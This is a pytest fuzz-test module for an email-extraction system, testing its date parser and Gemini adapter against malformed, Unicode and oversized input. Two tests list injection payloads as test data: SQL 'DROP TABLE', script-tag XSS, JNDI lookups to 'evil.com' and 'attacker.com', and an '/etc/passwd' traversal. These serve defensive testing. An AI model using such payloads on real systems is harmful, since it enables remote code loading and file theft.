"""Fuzz tests for CollabIQ system components.

This module provides systematic fuzz testing for:
- Email text processing and extraction
- LLM adapter robustness
- Date parser edge cases
- Notion integrator input validation

Tests use FuzzGenerator to create diverse invalid inputs and verify
graceful error handling without crashes.

Usage:
    pytest tests/fuzz/test_fuzzing.py -v
    pytest tests/fuzz/test_fuzzing.py -v -k "date"  # Only date tests
"""

import pytest

from collabiq.test_utils.fuzz_generator import (
    FuzzGenerator,
    FuzzConfig,
    FuzzCategory,
    generate_fuzz_emails,
    generate_fuzz_extraction_results,
    generate_fuzz_date_strings,
)
from collabiq.date_parser import parse_date
from llm_adapters.gemini_adapter import GeminiAdapter


class TestFuzzGenerator:
    """Tests for the fuzz generator utility itself."""

    def test_fuzz_generator_initialization(self):
        """Test FuzzGenerator can be initialized."""
        generator = FuzzGenerator()
        assert generator is not None
        assert generator.config is not None

    def test_fuzz_generator_with_seed(self):
        """Test FuzzGenerator produces reproducible results with seed."""
        # Generate multiple results with same seed
        results1 = []
        for _ in range(3):
            config = FuzzConfig(seed=42)
            gen = FuzzGenerator(config)
            results1.append(gen.generate_email_text(FuzzCategory.MALFORMED))

        results2 = []
        for _ in range(3):
            config = FuzzConfig(seed=42)
            gen = FuzzGenerator(config)
            results2.append(gen.generate_email_text(FuzzCategory.MALFORMED))

        # Same seed should produce same sequence
        assert results1 == results2

    def test_generate_all_categories(self):
        """Test FuzzGenerator can generate all categories."""
        generator = FuzzGenerator()

        for category in FuzzCategory:
            result = generator.generate_string(category)
            assert result is not None
            assert isinstance(result, str)

    def test_generate_fuzz_emails(self):
        """Test generate_fuzz_emails produces expected count."""
        emails = list(generate_fuzz_emails(count=5))
        assert len(emails) == 5
        assert all(isinstance(e, str) for e in emails)

    def test_generate_fuzz_extraction_results(self):
        """Test generate_fuzz_extraction_results produces dictionaries."""
        results = list(generate_fuzz_extraction_results(count=5))
        assert len(results) == 5
        assert all(isinstance(r, dict) for r in results)

    def test_generate_fuzz_date_strings(self):
        """Test generate_fuzz_date_strings produces strings."""
        dates = list(generate_fuzz_date_strings(count=5))
        assert len(dates) == 5
        assert all(isinstance(d, str) for d in dates)


class TestDateParserFuzzing:
    """Fuzz tests for date parser robustness."""

    @pytest.fixture
    def fuzz_generator(self):
        """Create fuzz generator with fixed seed."""
        return FuzzGenerator(FuzzConfig(seed=123, include_valid=False))

    def test_empty_string_handling(self, fuzz_generator):
        """Test date parser handles empty strings gracefully."""
        empty_inputs = [
            "",
            " ",
            "\n",
            "\t",
            "   ",
        ]

        for input_str in empty_inputs:
            result = parse_date(input_str)
            # Should not crash, return None or empty result
            assert result is not None

    def test_malformed_date_handling(self, fuzz_generator):
        """Test date parser handles malformed dates gracefully."""
        malformed_dates = [
            "2025-13-45",  # Invalid month/day
            "2025/12/01",  # Wrong separator
            "Dec 1st, 2025",  # English format
            "1일 12월 2025년",  # Wrong order
            "2025-12-",  # Incomplete
            "{json: 'date'}",  # JSON
            "javascript:alert(1)",  # XSS attempt
        ]

        for date_str in malformed_dates:
            try:
                result = parse_date(date_str)
                # Should not crash
                assert result is not None
            except Exception as e:
                # If it raises, should be a controlled exception
                assert "parse" in str(e).lower() or "invalid" in str(e).lower()

    def test_unicode_edge_cases(self, fuzz_generator):
        """Test date parser handles Unicode edge cases."""
        unicode_inputs = list(
            generate_fuzz_date_strings(
                count=10,
                config=FuzzConfig(seed=123, include_valid=False),
                categories=[FuzzCategory.UNICODE],
            )
        )

        for input_str in unicode_inputs:
            try:
                result = parse_date(input_str)
                assert result is not None
            except Exception:
                # Should handle gracefully, not crash
                pass

    def test_boundary_dates(self, fuzz_generator):
        """Test date parser handles boundary conditions."""
        boundary_dates = [
            "0000-01-01",  # Minimum date
            "9999-12-31",  # Maximum date
            "2025-02-30",  # Invalid day for month
            "2025-00-01",  # Zero month
            "2025-12-00",  # Zero day
        ]

        for date_str in boundary_dates:
            try:
                result = parse_date(date_str)
                assert result is not None
            except Exception:
                # Boundary errors should be handled
                pass

    def test_oversized_input(self, fuzz_generator):
        """Test date parser handles very long inputs."""
        oversized_input = "X" * 10000

        try:
            result = parse_date(oversized_input)
            assert result is not None
        except Exception:
            # Should handle gracefully
            pass

    def test_special_character_injection(self, fuzz_generator):
        """Test date parser handles injection attempts."""
        injection_attempts = [
            "'; DROP TABLE dates; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com}",
            "../../../etc/passwd",
        ]

        for input_str in injection_attempts:
            try:
                result = parse_date(input_str)
                assert result is not None
                # Should not interpret as code
            except Exception:
                # Should be safely rejected
                pass


class TestLLMAdapterFuzzing:
    """Fuzz tests for LLM adapter robustness."""

    @pytest.fixture
    def gemini_adapter(self):
        """Create Gemini adapter for testing."""
        import os

        api_key = os.getenv("GEMINI_API_KEY")
        if not api_key:
            pytest.skip("GEMINI_API_KEY not available")
        return GeminiAdapter(api_key)

    @pytest.fixture
    def fuzz_generator(self):
        """Create fuzz generator with fixed seed."""
        return FuzzGenerator(FuzzConfig(seed=456, include_valid=False))

    def test_empty_email_handling(self, gemini_adapter):
        """Test LLM adapter handles empty emails gracefully."""
        empty_inputs = ["", " ", "\n\n\n", "   "]

        for email_text in empty_inputs:
            try:
                result = gemini_adapter.extract_entities(email_text)
                # Should return structured result, not crash
                assert isinstance(result, dict)
            except Exception as e:
                # Should have controlled error handling
                assert "empty" in str(e).lower() or "invalid" in str(e).lower()

    @pytest.mark.integration
    def test_malformed_email_handling(self, gemini_adapter, fuzz_generator):
        """Test LLM adapter handles malformed emails."""
        malformed_emails = list(
            generate_fuzz_emails(
                count=5,
                config=FuzzConfig(seed=456, include_valid=False),
                categories=[FuzzCategory.MALFORMED],
            )
        )

        for email_text in malformed_emails[:3]:  # Test first 3 to avoid rate limits
            try:
                result = gemini_adapter.extract_entities(email_text)
                # Should return structured result
                assert isinstance(result, dict)
            except Exception:
                # May fail, but should not crash the process
                pass

    @pytest.mark.integration
    def test_unicode_email_handling(self, gemini_adapter):
        """Test LLM adapter handles Unicode emails."""
        unicode_emails = [
            "🔥💯🎉" * 10,  # Emoji spam
            "안녕하세요 👋 こんにちは 你好",  # Mixed scripts
            "ﷺ" * 100,  # Complex Unicode
        ]

        for email_text in unicode_emails:
            try:
                result = gemini_adapter.extract_entities(email_text)
                assert isinstance(result, dict)
            except Exception:
                # May fail, but should handle gracefully
                pass

    def test_injection_attempts(self, gemini_adapter):
        """Test LLM adapter handles injection attempts."""
        injection_emails = [
            "'; DROP TABLE companies; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://attacker.com}",
            "{{7*7}}",
        ]

        for email_text in injection_emails:
            try:
                result = gemini_adapter.extract_entities(email_text)
                # Should treat as text, not code
                assert isinstance(result, dict)
            except Exception:
                # Should be safely rejected
                pass


class TestExtractionResultFuzzing:
    """Fuzz tests for extraction result validation."""

    @pytest.fixture
    def fuzz_generator(self):
        """Create fuzz generator with fixed seed."""
        return FuzzGenerator(FuzzConfig(seed=789, include_valid=False))

    def test_missing_fields_handling(self, fuzz_generator):
        """Test system handles missing extraction fields."""
        missing_field_results = list(
            generate_fuzz_extraction_results(
                count=5,
                config=FuzzConfig(seed=789, include_valid=False),
                categories=[FuzzCategory.MISSING_FIELDS],
            )
        )

        for result in missing_field_results:
            # System should validate and handle missing fields
            assert isinstance(result, dict)
            # May have 0-5 fields present
            assert len(result) <= 5

    def test_type_mismatch_handling(self, fuzz_generator):
        """Test system handles type mismatches in extraction results."""
        type_mismatch_results = list(
            generate_fuzz_extraction_results(
                count=5,
                config=FuzzConfig(seed=789, include_valid=False),
                categories=[FuzzCategory.TYPE_MISMATCH],
            )
        )

        for result in type_mismatch_results:
            # System should validate types
            assert isinstance(result, dict)
            # Validation should catch type errors

    def test_empty_values_handling(self, fuzz_generator):
        """Test system handles empty extraction values."""
        empty_results = list(
            generate_fuzz_extraction_results(
                count=5,
                config=FuzzConfig(seed=789, include_valid=False),
                categories=[FuzzCategory.EMPTY],
            )
        )

        for result in empty_results:
            # System should handle empty/null values
            assert isinstance(result, dict)
            assert "startup_name" in result or len(result) >= 0


class TestFuzzingComprehensive:
    """Comprehensive fuzz testing across all categories."""

    @pytest.fixture
    def fuzz_config(self):
        """Create comprehensive fuzz configuration."""
        return FuzzConfig(
            categories=list(FuzzCategory),
            seed=999,
            include_valid=True,
            valid_ratio=0.1,
        )

    def test_all_categories_date_parser(self, fuzz_config):
        """Test date parser against all fuzz categories."""
        date_strings = list(generate_fuzz_date_strings(count=20, config=fuzz_config))

        errors = []

        for i, date_str in enumerate(date_strings):
            try:
                result = parse_date(date_str)
                assert result is not None
            except Exception as e:
                # Track errors but don't fail test
                errors.append((i, date_str, str(e)))

        # Should handle majority gracefully (at least 50%)
        success_rate = (len(date_strings) - len(errors)) / len(date_strings)
        assert success_rate >= 0.5, (
            f"Too many errors: {len(errors)}/{len(date_strings)}"
        )

    def test_all_categories_email_structure(self, fuzz_config):
        """Test email structure validation against all categories."""
        emails = list(generate_fuzz_emails(count=20, config=fuzz_config))

        for email in emails:
            # All emails should be strings (basic contract)
            assert isinstance(email, str)

    def test_all_categories_extraction_structure(self, fuzz_config):
        """Test extraction result structure against all categories."""
        results = list(generate_fuzz_extraction_results(count=20, config=fuzz_config))

        for result in results:
            # All results should be dictionaries (basic contract)
            assert isinstance(result, dict)


class TestFuzzingReproducibility:
    """Tests for fuzz testing reproducibility."""

    def test_seed_reproducibility_emails(self):
        """Test same seed produces same email sequence."""
        config = FuzzConfig(seed=12345)

        emails1 = list(generate_fuzz_emails(count=10, config=config))
        emails2 = list(generate_fuzz_emails(count=10, config=config))

        assert emails1 == emails2

    def test_seed_reproducibility_extractions(self):
        """Test same seed produces same extraction sequence."""
        config = FuzzConfig(seed=67890)

        results1 = list(generate_fuzz_extraction_results(count=10, config=config))
        results2 = list(generate_fuzz_extraction_results(count=10, config=config))

        assert results1 == results2

    def test_different_seeds_differ(self):
        """Test different seeds produce different sequences."""
        config1 = FuzzConfig(seed=111)
        config2 = FuzzConfig(seed=222)

        emails1 = list(generate_fuzz_emails(count=10, config=config1))
        emails2 = list(generate_fuzz_emails(count=10, config=config2))

        # Should be different (very high probability)
        assert emails1 != emails2
